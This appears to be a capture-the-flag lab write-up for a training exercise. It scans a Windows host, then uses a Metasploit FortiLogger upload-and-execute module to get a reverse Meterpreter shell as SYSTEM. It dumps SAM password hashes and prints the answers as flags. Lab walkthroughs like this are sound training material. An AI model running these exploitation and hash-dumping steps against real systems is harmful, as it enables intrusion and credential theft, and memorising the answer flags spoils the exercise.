### Sessions Exercise
 
IP: 10.129.68.5
 
---
 
### Question 1:
Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?
 
```diff
+ $ nmap -sV -sT -A -sC 10.129.68.5
```
 
	PORT     STATE SERVICE       VERSION
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds?
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	5000/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 
Examining the web server on port 5000, I see that it's FortiLogger. Using this, I search it against Metasploit and find an exploit module for it.
 
```diff
+ msf6 > search fortilogger
+ msf6 > use windows/http/fortilogger_ssrf_upload_exec
+ msf6 exploit(windows/http/fortilogger_ssrf_upload_exec) > set rhosts 10.129.68.5
+ msf6 exploit(windows/http/fortilogger_ssrf_upload_exec) > set lhost 10.10.14.36
+ msf6 exploit(windows/http/fortilogger_ssrf_upload_exec) > run
```
 
	[*] Started reverse TCP handler on 10.10.14.36:4444
	[+] The target is vulnerable. FortiLogger version 4.4.2.2
	[+] Generate Payload
	[+] Payload has been uploaded
	[*] Executing payload...
	[*] Sending stage (190534 bytes) to 10.129.68.5
	[*] Meterpreter session 1 opened (10.10.14.36:4444 -> 10.129.68.5:49686)
 
Configuring the exploit module and running it grants me a shell.
 
#### Get the user via getuid:
 
```diff
+ (Meterpreter 1)(C:\Windows\system32) > getuid
```
 
	Server username: NT AUTHORITY\SYSTEM
 
&#x1F6A9; found **NT AUTHORITY\SYSTEM**.
 
---
 
### Question 2:
Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.
 
I then run an `lsa_dump_sam` and find the hash for the htb-student user.
 
```diff
+ (Meterpreter 1)(C:\Windows\system32) > lsa_dump_sam
```
 
	[+] Running as SYSTEM
	[*] Dumping SAM
	Domain : WIN-51BJ97BCIPV
	SysKey : c897d22c1c56490b453e326f86b2eef8
	Local SID : S-1-5-21-2348711446-3829538955-3974936019
	SAMKey : e52d743c76043bf814df6e48f1efcb23
 
	RID  : 000001f4 (500)
	User : Administrator
	  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99
	<snip>
	RID  : 000003ea (1002)
	User : htb-student
	  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
 
&#x1F6A9; found **cf3a5525ee9414229e66279623ed5c58**.
